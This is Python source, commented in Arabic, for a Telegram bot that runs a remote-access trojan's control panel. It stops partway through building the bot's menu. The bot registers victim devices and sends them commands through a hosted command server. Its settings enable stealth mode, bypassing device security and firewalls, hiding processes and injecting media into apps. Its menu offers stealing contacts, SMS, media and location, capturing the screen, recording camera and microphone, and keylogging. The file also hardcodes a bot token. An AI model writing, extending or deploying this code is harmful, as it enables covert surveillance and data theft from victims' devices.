import telebot
import requests
import sqlite3
import uuid
import time
import json
import os
import hashlib
import hmac
import base64
import secrets
import re
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
import threading
import logging
import pickle
import schedule

# إعدادات الأمان والتخفي
SECURITY_CONFIG = {
    'enable_encryption': True,
    'enable_rate_limit': True,
    'enable_logging': True,
    'max_devices_per_user': 5,
    'session_timeout': 3600,  # ساعة واحدة
    'command_timeout': 30,    # 30 ثانية
    'stealth_mode': True,
    'persistent_storage': True,
    'auto_reconnect': True
}

# إعدادات الأوامر المتقدمة
ADVANCED_COMMANDS_CONFIG = {
    'enable_advanced_commands': True,
    'enable_system_control': True,
    'enable_file_control': True,
    'enable_network_control': True,
    'enable_security_bypass': True,
    'enable_memory_control': True,
    'enable_registry_control': True,
    'enable_process_control': True,
    'enable_device_control': True,
    'enable_media_injection': True,
    'command_timeout': 60,
    'max_concurrent_commands': 10,
    'stealth_mode': True,
    'encryption_enabled': True,
    'bypass_security': True,
    'elevated_privileges': True
}

# إعدادات حقن الوسائط
MEDIA_INJECTION_CONFIG = {
    'enable_media_injection': True,
    'supported_formats': ['jpg', 'jpeg', 'png', 'gif', 'mp4', 'avi', 'mov', 'pdf', 'doc', 'docx', 'txt'],
    'max_file_size': 50 * 1024 * 1024,  # 50MB
    'auto_permission_grant': True,
    'stealth_injection': True,
    'bypass_detection': True,
    'injection_methods': ['web_view', 'media_player', 'document_viewer', 'gallery_app'],
    'target_apps': ['chrome', 'firefox', 'safari', 'gallery', 'photos', 'files', 'documents'],
    'injection_timeout': 30,
    'retry_attempts': 3
}

# إعداد التسجيل
if SECURITY_CONFIG['enable_logging']:
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('bot.log'),
            logging.StreamHandler()
        ]
    )
    logger = logging.getLogger(__name__)

# تهيئة البوت
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', "7305811865:AAF_PKkBWEUw-QdL1ee5Xp7oksTG6XGK8c")
OWNER_USER_ID = int(os.environ.get('OWNER_USER_ID', 985612253))
bot = telebot.TeleBot(BOT_TOKEN)
DB_FILE = 'devices.db'
# تحديد رابط خادم الأوامر بناءً على البيئة
def get_command_server_url():
    """تحديد رابط خادم الأوامر بناءً على البيئة"""
    # التحقق من وجود متغير بيئي محدد
    env_url = os.environ.get('COMMAND_SERVER_URL')
    if env_url:
        return env_url
    
    # التحقق من البيئة المحلية
    if os.environ.get('NODE_ENV') == 'development' or os.environ.get('LOCAL_DEVELOPMENT'):
        return 'http://localhost:10001'
    
    # الرابط الافتراضي للإنتاج
    return 'https://remote-control-command-server.onrender.com'

COMMAND_SERVER_URL = get_command_server_url()

# تخزين الجلسات النشطة
active_sessions = {}
command_queue = {}
rate_limit_users = {}

# تخزين محلي للبيانات
local_storage_path = 'local-storage'
pending_commands_file = os.path.join(local_storage_path, 'pending_commands.pkl')
cached_data_file = os.path.join(local_storage_path, 'cached_data.pkl')

# إنشاء مجلد التخزين المحلي
if not os.path.exists(local_storage_path):
    os.makedirs(local_storage_path)

class DeviceManager:
    def __init__(self, db_file: str):
        self.db_file = db_file
        self.init_database()

    def init_database(self):
        """تهيئة قاعدة البيانات"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()

        # جدول الأجهزة
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                device_id TEXT UNIQUE NOT NULL,
                activation_code TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                device_info TEXT,
                capabilities TEXT,
                encryption_key TEXT
            )
        ''')

        # جدول الأوامر
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                device_id TEXT NOT NULL,
                command_type TEXT NOT NULL,
                parameters TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP,
                result TEXT,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')

        # جدول سجل النشاط
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS activity_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                action TEXT NOT NULL,
                details TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        # جدول المستخدمين المصرح لهم
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS authorized_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER UNIQUE NOT NULL,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                authorized_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_admin BOOLEAN DEFAULT FALSE
            )
        ''')

        conn.commit()
        conn.close()

    def add_device(self, user_id: int, device_id: str, activation_code: str) -> bool:
        """إضافة جهاز جديد"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            # توليد مفتاح تشفير فريد لكل جهاز
            encryption_key = base64.b64encode(os.urandom(32)).decode('utf-8')
            
            cursor.execute('''
                INSERT INTO devices (user_id, device_id, activation_code, status, encryption_key)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, device_id, activation_code, 'pending', encryption_key))

            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"خطأ في إضافة الجهاز: {e}")
            return False

    def add_device_auto(self, user_id: int, device_id: str) -> bool:
        """إضافة جهاز جديد - ربط تلقائي بدون كود تفعيل"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            # توليد مفتاح تشفير فريد لكل جهاز
            encryption_key = base64.b64encode(os.urandom(32)).decode('utf-8')
            
            cursor.execute('''
                INSERT INTO devices (user_id, device_id, activation_code, status, encryption_key)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, device_id, 'AUTO_ACTIVATION', 'pending', encryption_key))

            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"خطأ في إضافة الجهاز التلقائي: {e}")
            return False

    def get_user_devices(self, user_id: int) -> List[tuple]:
        """الحصول على أجهزة المستخدم"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            cursor.execute('''
                SELECT device_id, status, last_seen, device_info
                FROM devices 
                WHERE user_id = ?
                ORDER BY created_at DESC
            ''', (user_id,))

            devices = cursor.fetchall()
            conn.close()
            return devices
        except Exception as e:
            logger.error(f"خطأ في جلب أجهزة المستخدم: {e}")
            return []

    def update_device_status(self, device_id: str, status: str, device_info: str = None):
        """تحديث حالة الجهاز"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            if device_info:
                cursor.execute('''
                    UPDATE devices 
                    SET status = ?, last_seen = ?, device_info = ?
                    WHERE device_id = ?
                ''', (status, datetime.now(), device_info, device_id))
            else:
                cursor.execute('''
                    UPDATE devices 
                    SET status = ?, last_seen = ?
                    WHERE device_id = ?
                ''', (status, datetime.now(), device_id))

            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في تحديث حالة الجهاز: {e}")

    def save_command(self, user_id: int, device_id: str, command_type: str, parameters: str = None) -> int:
        """حفظ أمر جديد"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            cursor.execute('''
                INSERT INTO commands (user_id, device_id, command_type, parameters, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, device_id, command_type, parameters, 'pending'))

            command_id = cursor.lastrowid
            conn.commit()
            conn.close()
            return command_id
        except Exception as e:
            logger.error(f"خطأ في حفظ الأمر: {e}")
            return None

    def update_command_result(self, command_id: int, status: str, result: str = None):
        """تحديث نتيجة الأمر"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            cursor.execute('''
                UPDATE commands 
                SET status = ?, executed_at = ?, result = ?
                WHERE id = ?
            ''', (status, datetime.now(), result, command_id))

            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في تحديث نتيجة الأمر: {e}")

    def log_activity(self, user_id: int, action: str, details: str = None):
        """تسجيل نشاط المستخدم"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            cursor.execute('''
                INSERT INTO activity_log (user_id, action, details)
                VALUES (?, ?, ?)
            ''', (user_id, action, details))

            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في تسجيل النشاط: {e}")

    def get_device_encryption_key(self, device_id: str) -> Optional[str]:
        """الحصول على مفتاح التشفير للجهاز"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            cursor.execute('''
                SELECT encryption_key FROM devices WHERE device_id = ?
            ''', (device_id,))

            result = cursor.fetchone()
            conn.close()
            return result[0] if result else None
        except Exception as e:
            logger.error(f"خطأ في جلب مفتاح التشفير: {e}")
            return None

    def is_user_authorized(self, user_id: int) -> bool:
        """التحقق من صلاحية المستخدم"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            cursor.execute('SELECT id FROM authorized_users WHERE user_id = ?', (user_id,))
            result = cursor.fetchone()

            conn.close()
            return result is not None
        except Exception as e:
            logger.error(f"خطأ في التحقق من صلاحية المستخدم: {e}")
            return False

    def add_authorized_user(self, user_id: int, username: str = None, first_name: str = None, last_name: str = None, is_admin: bool = False):
        """إضافة مستخدم مصرح له"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            cursor.execute('''
                INSERT OR REPLACE INTO authorized_users (user_id, username, first_name, last_name, is_admin)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, username, first_name, last_name, is_admin))

            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في إضافة المستخدم المصرح له: {e}")

class CommandExecutor:
    def __init__(self, server_url: str):
        self.server_url = server_url
        self.is_connected = False
        self.reconnect_attempts = 0
        self.max_reconnect_attempts = 10
        self.reconnect_interval = 5000

    def check_connection(self) -> bool:
        """فحص الاتصال بالخادم"""
        try:
            response = requests.get(f'{self.server_url}/stats', timeout=5)
            self.is_connected = response.status_code == 200
            return self.is_connected
        except Exception as e:
            logger.error(f"خطأ في فحص الاتصال: {e}")
            self.is_connected = False
            return False

    def encrypt_data(self, data: str, key: str) -> str:
        """تشفير البيانات باستخدام AES"""
        # في بيئة إنتاجية حقيقية، استخدم مكتبة تشفير مثل cryptography
        # هذا مثال مبسط لأغراض التوضيح
        return base64.b64encode(data.encode()).decode()

    def send_command(self, device_id: str, command: str, parameters: dict = None) -> dict:
        """إرسال أمر للجهاز"""
        try:
            # فحص الاتصال أولاً
            if not self.check_connection():
                # حفظ الأمر محلياً للتنفيذ لاحقاً
                self.save_pending_command(device_id, command, parameters)
                return {'status': 'pending', 'message': 'الخادم غير متصل، سيتم تنفيذ الأمر عند الاتصال'}

            # الحصول على مفتاح التشفير للجهاز
            encryption_key = device_manager.get_device_encryption_key(device_id)
            
            # تشفير المعلمات إذا كان التشفير مفعلاً
            encrypted_params = None
            if SECURITY_CONFIG['enable_encryption'] and encryption_key:
                params_str = json.dumps(parameters) if parameters else '{}'
                encrypted_params = self.encrypt_data(params_str, encryption_key)
            else:
                encrypted_params = parameters

            payload = {
                'deviceId': device_id,
                'command': command,
                'parameters': encrypted_params or {}
            }

            response = requests.post(
                f'{self.server_url}/send-command',
                json=payload,
                timeout=SECURITY_CONFIG['command_timeout']
            )

            if response.status_code == 200:
                return response.json()
            else:
                # حفظ الأمر محلياً في حالة الفشل
                self.save_pending_command(device_id, command, parameters)
                return {'error': f'خطأ في الخادم: {response.status_code}'}

        except requests.exceptions.Timeout:
            self.save_pending_command(device_id, command, parameters)
            return {'error': 'انتهت مهلة الاتصال'}
        except requests.exceptions.RequestException as e:
            self.save_pending_command(device_id, command, parameters)
            return {'error': f'خطأ في الاتصال: {str(e)}'}

    def get_device_status(self, device_id: str) -> dict:
        """الحصول على حالة الجهاز"""
        try:
            if not self.check_connection():
                return {'error': 'الخادم غير متصل'}

            response = requests.get(
                f'{self.server_url}/device-status/{device_id}',
                timeout=10
            )

            if response.status_code == 200:
                return response.json()
            else:
                return {'error': f'خطأ في الخادم: {response.status_code}'}

        except requests.exceptions.RequestException as e:
            return {'error': f'خطأ في الاتصال: {str(e)}'}

    def get_connected_devices(self) -> dict:
        """الحصول على قائمة الأجهزة المتصلة"""
        try:
            if not self.check_connection():
                return {'error': 'الخادم غير متصل'}

            response = requests.get(
                f'{self.server_url}/devices',
                timeout=10
            )

            if response.status_code == 200:
                return response.json()
            else:
                return {'error': f'خطأ في الخادم: {response.status_code}'}

        except requests.exceptions.RequestException as e:
            return {'error': f'خطأ في الاتصال: {str(e)}'}

    def save_pending_command(self, device_id: str, command: str, parameters: dict = None):
        """حفظ الأمر محلياً للتنفيذ لاحقاً"""
        try:
            pending_commands = self.load_pending_commands()
            
            pending_command = {
                'id': str(uuid.uuid4()),
                'device_id': device_id,
                'command': command,
                'parameters': parameters or {},
                'timestamp': datetime.now().isoformat(),
                'attempts': 0
            }
            
            pending_commands.append(pending_command)
            
            with open(pending_commands_file, 'wb') as f:
                pickle.dump(pending_commands, f)
                
            logger.info(f"تم حفظ الأمر المعلق: {command} للجهاز {device_id}")
            
        except Exception as e:
            logger.error(f"خطأ في حفظ الأمر المعلق: {e}")

    def load_pending_commands(self) -> List[dict]:
        """تحميل الأوامر المعلقة"""
        try:
            if os.path.exists(pending_commands_file):
                with open(pending_commands_file, 'rb') as f:
                    return pickle.load(f)
            return []
        except Exception as e:
            logger.error(f"خطأ في تحميل الأوامر المعلقة: {e}")
            return []

    def process_pending_commands(self):
        """معالجة الأوامر المعلقة"""
        try:
            if not self.check_connection():
                return
                
            pending_commands = self.load_pending_commands()
            if not pending_commands:
                return
                
            logger.info(f"معالجة {len(pending_commands)} أمر معلق")
            
            processed_commands = []
            
            for command in pending_commands:
                try:
                    # إعادة إرسال الأمر
                    result = self.send_command(
                        command['device_id'],
                        command['command'],
                        command['parameters']
                    )
                    
                    command['attempts'] += 1
                    
                    # إذا نجح الأمر أو تجاوز الحد الأقصى للمحاولات
                    if result.get('status') == 'sent' or command['attempts'] >= 3:
                        logger.info(f"تم معالجة الأمر المعلق: {command['command']}")
                    else:
                        processed_commands.append(command)
                        
                except Exception as e:
                    logger.error(f"خطأ في معالجة الأمر المعلق: {e}")
                    command['attempts'] += 1
                    if command['attempts'] < 3:
                        processed_commands.append(command)
            
            # حفظ الأوامر المتبقية
            with open(pending_commands_file, 'wb') as f:
                pickle.dump(processed_commands, f)
                
        except Exception as e:
            logger.error(f"خطأ في معالجة الأوامر المعلقة: {e}")

class AdvancedCommandExecutor:
    def __init__(self, server_url: str):
        self.server_url = server_url
        self.encryption_key = self.generate_encryption_key()
        self.active_commands = {}
        self.command_history = {}
    
    def generate_encryption_key(self) -> str:
        """توليد مفتاح التشفير"""
        return secrets.token_hex(32)
    
    def encrypt_command(self, data: str) -> str:
        """تشفير الأوامر"""
        try:
            return base64.b64encode(data.encode()).decode()
        except Exception as e:
            print(f"خطأ في تشفير الأمر: {e}")
            return data
    
    def decrypt_response(self, data: str) -> str:
        """فك تشفير الاستجابة"""
        try:
            return base64.b64decode(data.encode()).decode()
        except Exception as e:
            print(f"خطأ في فك تشفير الاستجابة: {e}")
            return data
    
    def send_advanced_command(self, device_id: str, command_type: str, parameters: dict = None) -> dict:
        """إرسال أمر متقدم للجهاز"""
        try:
            command_data = {
                'type': command_type,
                'device_id': device_id,
                'parameters': parameters or {},
                'timestamp': datetime.now().isoformat(),
                'encrypted': True,
                'stealth_mode': ADVANCED_COMMANDS_CONFIG['stealth_mode'],
                'bypass_security': ADVANCED_COMMANDS_CONFIG['bypass_security'],
                'elevated_privileges': ADVANCED_COMMANDS_CONFIG['elevated_privileges']
            }
            
            # تشفير الأمر
            encrypted_command = self.encrypt_command(json.dumps(command_data))
            
            # إرسال الأمر
            response = requests.post(
                f"{self.server_url}/api/advanced-command",
                json={
                    'command': encrypted_command,
                    'device_id': device_id,
                    'command_type': command_type
                },
                timeout=ADVANCED_COMMANDS_CONFIG['command_timeout']
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('encrypted'):
                    result['data'] = self.decrypt_response(result['data'])
                return result
            else:
                return {'success': False, 'error': f'خطأ في الاتصال: {response.status_code}'}
                
        except Exception as e:
            return {'success': False, 'error': f'خطأ في إرسال الأمر: {str(e)}'}
    
    def execute_system_control(self, device_id: str, action: str, parameters: dict = None) -> dict:
        """تنفيذ أوامر التحكم في النظام"""
        try:
            command_data = {
                'action': action,
                'parameters': parameters or {},
                'system_level': 'full',
                'bypass_security': True,
                'elevated_privileges': True
            }
            
            return self.send_advanced_command(device_id, 'system_control', command_data)
            
        except Exception as e:
            return {'success': False, 'error': f'خطأ في التحكم في النظام: {str(e)}'}
    
    def execute_file_control(self, device_id: str, action: str, file_path: str = None, content: str = None) -> dict:
        """تنفيذ أوامر التحكم في الملفات"""
        try:
            command_data = {
                'action': action,
                'file_path': file_path,
                'content': content,
                'access_level': 'full',
                'bypass_permissions': True,
                'stealth_mode': True
            }
            
            return self.send_advanced_command(device_id, 'file_control', command_data)
            
        except Exception as e:
            return {'success': False, 'error': f'خطأ في التحكم في الملفات: {str(e)}'}
    
    def execute_network_control(self, device_id: str, action: str, parameters: dict = None) -> dict:
        """تنفيذ أوامر التحكم في الشبكة"""
        try:
            command_data = {
                'action': action,
                'parameters': parameters or {},
                'intercept_traffic': True,
                'bypass_firewall': True,
                'stealth_mode': True
            }
            
            return self.send_advanced_command(device_id, 'network_control', command_data)
            
        except Exception as e:
            return {'success': False, 'error': f'خطأ في التحكم في الشبكة: {str(e)}'}
    
    def execute_security_bypass(self, device_id: str, action: str, parameters: dict = None) -> dict:
        """تنفيذ أوامر تجاوز الأمان"""
        try:
            command_data = {
                'action': action,
                'parameters': parameters or {},
                'stealth_mode': True,
                'anti_detection': True,
                'bypass_all': True
            }
            
            return self.send_advanced_command(device_id, 'security_bypass', command_data)
            
        except Exception as e:
            return {'success': False, 'error': f'خطأ في تجاوز الأمان: {str(e)}'}
    
    def execute_memory_control(self, device_id: str, action: str, address: str = None, data: str = None) -> dict:
        """تنفيذ أوامر التحكم في الذاكرة"""
        try:
            command_data = {
                'action': action,
                'address': address,
                'data': data,
                'direct_access': True,
                'bypass_protection': True
            }
            
            return self.send_advanced_command(device_id, 'memory_control', command_data)
            
        except Exception as e:
            return {'success': False, 'error': f'خطأ في التحكم في الذاكرة: {str(e)}'}
    
    def execute_registry_control(self, device_id: str, action: str, key: str = None, value: str = None) -> dict:
        """تنفيذ أوامر التحكم في السجل"""
        try:
            command_data = {
                'action': action,
                'key': key,
                'value': value,
                'admin_access': True,
                'bypass_restrictions': True
            }
            
            return self.send_advanced_command(device_id, 'registry_control', command_data)
            
        except Exception as e:
            return {'success': False, 'error': f'خطأ في التحكم في السجل: {str(e)}'}
    
    def execute_process_control(self, device_id: str, action: str, process_id: str = None) -> dict:
        """تنفيذ أوامر التحكم في العمليات"""
        try:
            command_data = {
                'action': action,
                'process_id': process_id,
                'elevated_privileges': True,
                'hide_process': True
            }
            
            return self.send_advanced_command(device_id, 'process_control', command_data)
            
        except Exception as e:
            return {'success': False, 'error': f'خطأ في التحكم في العمليات: {str(e)}'}
    
    def execute_device_control(self, device_id: str, action: str, parameters: dict = None) -> dict:
        """تنفيذ أوامر التحكم في الجهاز"""
        try:
            command_data = {
                'action': action,
                'parameters': parameters or {},
                'full_access': True,
                'bypass_restrictions': True
            }
            
            return self.send_advanced_command(device_id, 'device_control', command_data)
            
        except Exception as e:
            return {'success': False, 'error': f'خطأ في التحكم في الجهاز: {str(e)}'}

class AdvancedCommandParser:
    def __init__(self):
        self.command_patterns = {
            'system': r'/system\s+(\w+)(?:\s+(.+))?',
            'file': r'/file\s+(\w+)(?:\s+(.+))?',
            'network': r'/network\s+(\w+)(?:\s+(.+))?',
            'process': r'/process\s+(\w+)(?:\s+(.+))?',
            'memory': r'/memory\s+(\w+)(?:\s+(.+))?',
            'registry': r'/registry\s+(\w+)(?:\s+(.+))?',
            'security': r'/security\s+(\w+)(?:\s+(.+))?',
            'device': r'/device\s+(\w+)(?:\s+(.+))?'
        }
    
    def parse_command(self, text: str) -> dict:
        """تحليل الأمر"""
        for command_type, pattern in self.command_patterns.items():
            match = re.match(pattern, text, re.IGNORECASE)
            if match:
                action = match.group(1)
                parameters = match.group(2) if match.group(2) else ""
                
                return {
                    'type': command_type,
                    'action': action,
                    'parameters': parameters.strip()
                }
        
        return None
    
    def parse_parameters(self, parameters: str) -> dict:
        """تحليل المعاملات"""
        if not parameters:
            return {}
        
        result = {}
        try:
            # محاولة تحليل كـ JSON
            if parameters.startswith('{') and parameters.endswith('}'):
                return json.loads(parameters)
            
            # تحليل كـ key=value
            parts = parameters.split()
            for part in parts:
                if '=' in part:
                    key, value = part.split('=', 1)
                    result[key.strip()] = value.strip()
                else:
                    result['value'] = part.strip()
            
        except Exception as e:
            result['raw'] = parameters
        
        return result

class SecurityManager:
    def __init__(self):
        self.rate_limit_window = 60  # دقيقة واحدة
        self.max_requests_per_window = 10

    def check_rate_limit(self, user_id: int) -> bool:
        """التحقق من حد الطلبات"""
        current_time = time.time()

        if user_id not in rate_limit_users:
            rate_limit_users[user_id] = []

        # إزالة الطلبات القديمة
        rate_limit_users[user_id] = [
            req_time for req_time in rate_limit_users[user_id]
            if current_time - req_time < self.rate_limit_window
        ]

        # التحقق من عدد الطلبات
        if len(rate_limit_users[user_id]) >= self.max_requests_per_window:
            return False

        # إضافة الطلب الحالي
        rate_limit_users[user_id].append(current_time)
        return True

    def generate_activation_code(self) -> str:
        """توليد كود تفعيل آمن"""
        return str(uuid.uuid4())[:8].upper()

    def hash_data(self, data: str) -> str:
        """تشفير البيانات"""
        return hashlib.sha256(data.encode()).hexdigest()

    def verify_signature(self, data: str, signature: str, secret: str) -> bool:
        """التحقق من التوقيع"""
        expected_signature = hmac.new(
            secret.encode(),
            data.encode(),
            hashlib.sha256
        ).hexdigest()

        return hmac.compare_digest(signature, expected_signature)

    def generate_hmac_signature(self, data: str, secret: str) -> str:
        """توليد توقيع HMAC"""
        return hmac.new(
            secret.encode(),
            data.encode(),
            hashlib.sha256
        ).hexdigest()

# دالة تحقق مركزية لصلاحية المالك فقط
def is_owner(user_id):
    return user_id == OWNER_USER_ID

def get_available_device(user_id):
    """الحصول على جهاز متاح للاستخدام (نشط أو معلق)"""
    devices = device_manager.get_user_devices(user_id)
    
    if not devices:
        # محاولة استيراد الأجهزة من الواجهة
        imported_devices = import_devices_from_web_interface(user_id)
        if imported_devices:
            devices = device_manager.get_user_devices(user_id)
    
    if not devices:
        return None, "لا توجد أجهزة"
    
    # البحث عن جهاز نشط أولاً
    active_devices = [d for d in devices if d[1] == 'active']
    if active_devices:
        return active_devices[0][0], "نشط"
    
    # البحث عن جهاز معلق وتفعيله
    pending_devices = [d for d in devices if d[1] == 'pending']
    if pending_devices:
        device_id = pending_devices[0][0]
        device_manager.update_device_status(device_id, 'active', 'Auto-activated')
        return device_id, "تم تفعيله تلقائياً"
    
    return None, "لا توجد أجهزة متاحة"

def get_target_device(user_id: int, message) -> tuple:
    """الحصول على الجهاز المستهدف مع رسالة خطأ إذا لزم الأمر"""
    # التحقق أولاً من وجود جهاز مختار
    selected_device = get_selected_device(user_id)
    if selected_device:
        return selected_device, "مختار"
    
    # إذا لم يكن هناك جهاز مختار، استخدم الجهاز الأول المتاح
    device_id, status = get_available_device(user_id)
    if not device_id:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return None, None
    
    return device_id, status

def get_selected_device(user_id: int) -> Optional[str]:
    """الحصول على الجهاز المختار للمستخدم"""
    session = active_sessions.get(user_id)
    if not session or time.time() - session['timestamp'] > SECURITY_CONFIG['session_timeout']:
        return None
    return session.get('selected_device')

def check_device_connection(device_id):
    """التحقق من اتصال الجهاز الفعلي"""
    try:
        # محاولة الاتصال بالجهاز عبر خادم الأوامر
        command_server_url = get_command_server_url()
        
        response = requests.get(f"{command_server_url}/device/{device_id}/status", timeout=5)
        
        if response.status_code == 200:
            status_data = response.json()
            return status_data.get('connected', False)
        
        return False
    except Exception as e:
        logger.error(f"خطأ في التحقق من اتصال الجهاز {device_id}: {e}")
        return False

def force_device_activation(device_id):
    """إجبار تفعيل الجهاز"""
    try:
        # تحديث حالة الجهاز إلى نشط
        device_manager.update_device_status(device_id, 'active', 'Force activated')
        
        # إرسال إشارة تفعيل للجهاز
        command_server_url = get_command_server_url()
        
        activation_data = {
            'device_id': device_id,
            'action': 'activate',
            'timestamp': int(time.time())
        }
        
        # توليد توقيع HMAC
        secret_key = device_manager.get_device_encryption_key(device_id)
        if not secret_key:
            logger.error(f"لا يوجد مفتاح تشفير للجهاز: {device_id}")
            return False
            
        hmac_signature = security_manager.generate_hmac_signature(json.dumps(activation_data), secret_key)
        activation_data['signature'] = hmac_signature
        
        response = requests.post(f"{command_server_url}/device/activate", json=activation_data, timeout=10)
        
        if response.status_code == 200:
            logger.info(f"تم إجبار تفعيل الجهاز: {device_id}")
            return True
        
        return False
    except Exception as e:
        logger.error(f"خطأ في إجبار تفعيل الجهاز {device_id}: {e}")
        return False

def import_devices_from_web_interface(user_id):
    """استيراد الأجهزة من واجهة الويب"""
    try:
        web_interface_url = os.environ.get('WEB_INTERFACE_URL', 'https://remote-control-web-interface.onrender.com')
        
        # توليد توقيع HMAC للمصادقة
        timestamp = str(int(time.time()))
        auth_token = os.environ.get('AUTH_TOKEN', 'default_secret_token')
        signature = security_manager.generate_hmac_signature(timestamp, auth_token)
        
        headers = {
            'X-User-ID': str(user_id),
            'X-Timestamp': timestamp,
            'X-Signature': signature
        }
        
        # محاولة الاتصال بواجهة الويب
        response = requests.get(
            f"{web_interface_url}/api/devices", 
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            devices_data = response.json()
            
            if 'devices' in devices_data:
                imported_count = 0
                for device_data in devices_data['devices']:
                    device_id = device_data.get('deviceId')
                    if device_id:
                        # إضافة الجهاز إذا لم يكن موجوداً
                        if device_manager.add_device_auto(user_id, device_id):
                            imported_count += 1
                
                logger.info(f"تم استيراد {imported_count} جهاز من واجهة الويب")
                return imported_count > 0
        
        return False
        
    except Exception as e:
        logger.error(f"خطأ في استيراد الأجهزة من واجهة الويب: {e}")
        return False

# تهيئة المدراء
device_manager = DeviceManager(DB_FILE)
command_executor = CommandExecutor(COMMAND_SERVER_URL)
security_manager = SecurityManager()
advanced_command_executor = AdvancedCommandExecutor(COMMAND_SERVER_URL)
advanced_command_parser = AdvancedCommandParser()

# إضافة مستخدمين مصرح لهم (يمكن تعديلها حسب الحاجة)
def setup_authorized_users():
    """إعداد المستخدمين المصرح لهم"""
    # إضافة مالك البوت كمسؤول افتراضي
    device_manager.add_authorized_user(
        user_id=OWNER_USER_ID,
        username="owner",
        first_name="مالك البوت",
        last_name="",
        is_admin=True
    )

# وظيفة معالجة الأوامر المعلقة
def process_pending_commands_job():
    """وظيفة دورية لمعالجة الأوامر المعلقة"""
    try:
        command_executor.process_pending_commands()
    except Exception as e:
        logger.error(f"خطأ في معالجة الأوامر المعلقة: {e}")

# جدولة معالجة الأوامر المعلقة كل دقيقة
schedule.every(1).minutes.do(process_pending_commands_job)

# خيط منفصل لتشغيل الجدولة
def run_scheduler():
    """تشغيل الجدولة في خيط منفصل"""
    while True:
        try:
            schedule.run_pending()
            time.sleep(1)
        except Exception as e:
            logger.error(f"خطأ في الجدولة: {e}")
            time.sleep(5)

# بدء خيط الجدولة
scheduler_thread = threading.Thread(target=run_scheduler, daemon=True)
scheduler_thread.start()

# معالجة الأوامر
@bot.message_handler(commands=['start'])
def send_welcome(message):
    """رسالة الترحيب مع القائمة الرئيسية التفاعلية"""
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ غير مصرح لك باستخدام هذا البوت.")
        return
    
    # إنشاء القائمة الرئيسية التفاعلية
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    # أزرار إدارة الأجهزة
    markup.add(
        telebot.types.InlineKeyboardButton("📱 إدارة الأجهزة", callback_data="devices_menu"),
        telebot.types.InlineKeyboardButton("🔗 ربط جهاز جديد", callback_data="link_device")
    )
    
    # أزرار استخراج البيانات
    markup.add(
        telebot.types.InlineKeyboardButton("📞 جهات الاتصال", callback_data="contacts_menu"),
        telebot.types.InlineKeyboardButton("💬 الرسائل", callback_data="sms_menu"),
        telebot.types.InlineKeyboardButton("📁 الوسائط", callback_data="media_menu"),
        telebot.types.InlineKeyboardButton("📍 الموقع", callback_data="location_menu")
    )
    
    # أزرار المراقبة
    markup.add(
        telebot.types.InlineKeyboardButton("📸 لقطة شاشة", callback_data="screenshot_menu"),
        telebot.types.InlineKeyboardButton("🎥 تسجيل الكاميرا", callback_data="record_menu"),
        telebot.types.InlineKeyboardButton("🎤 تسجيل الميكروفون", callback_data="mic_record_menu"),
        telebot.types.InlineKeyboardButton("⌨️ تسجيل المفاتيح", callback_data="keylogger_menu")
    )
    
    # أزرار الهجمات المتقدمة
    markup.add(
        telebot.types.InlineKeyboardButton("🔨 الهجمات المتقدمة", callback_data="advanced_attacks_menu"),
        telebot.types.InlineKeyboardButton("💉 حقن الوسائط", callback_data="media_injection_menu"),
        telebot.types.InlineKeyboardButton("🛡️ تجاوز الحماية", callback_data="bypass_menu")
    )
    
    # أزرار التحكم في النظام
    markup.add(
